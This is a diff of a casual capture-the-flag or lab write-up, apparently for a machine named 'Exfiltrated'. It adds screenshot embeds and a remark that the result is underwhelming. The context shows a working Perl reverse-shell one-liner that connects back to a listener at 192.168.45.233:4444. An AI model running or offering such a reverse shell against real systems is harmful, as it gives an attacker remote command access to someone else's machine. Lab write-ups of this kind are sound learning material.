@@ -89,8 +89,14 @@ So we run the exploit:
 
 and we just happen to get in: cool beans, so ngl, I just found out that theres this thing called revshells.com after looking at an online guide because idk how to continue, but DAMN:
 
+![[Exfiltrated-1744342348811.jpeg]]
 
 
 ```
 perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.45.233:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 ```
+
+ngl, this feels abit underwhelming:
+
+![[Exfiltrated-1744342402815.jpeg]]
+
